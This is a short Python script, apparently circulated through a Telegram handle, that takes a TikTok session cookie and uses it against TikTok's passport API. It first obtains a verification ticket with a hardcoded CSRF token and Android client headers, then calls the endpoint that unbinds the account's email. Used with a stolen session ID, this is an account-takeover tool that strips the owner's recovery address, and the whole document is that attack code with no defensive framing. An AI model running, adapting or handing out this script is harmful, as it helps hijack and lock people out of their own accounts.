from requests import get, post

sessionid = input('sessionid: ')

url = 'https://api16-normal-c-useast1a.tiktokv.com/passport/shark/safe_verify/v2/?aid=1233'
headers = {
    'cookie': f'passport_csrf_token=1e39947b417c5d7413335af0b7031990; sessionid={sessionid}; install_id=7417798636816353056',
    'user-agent': 'com.ss.android.ugc.trill/360505 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/3.12.13.4-tiktok)',
    'x-tt-passport-csrf-token': '1e39947b417c5d7413335af0b7031990'
}
payload = {
    'product_scene':'37',
    'mix_mode':'1'
}

r = post(url, headers=headers, data=payload).json()['data']
if 'passport_ticket' not in r:
    print(r)
    exit()

passport_ticket = r['passport_ticket']
print(passport_ticket)
url = f'https://api16-normal-c-useast1a.tiktokv.com/passport/email/unbind/?passport_ticket={passport_ticket}&aid=1233'
payload = {
    'body': 'null'
}
r = post(url, headers=headers, data=payload).text
print(r)

# t.me/keyboards
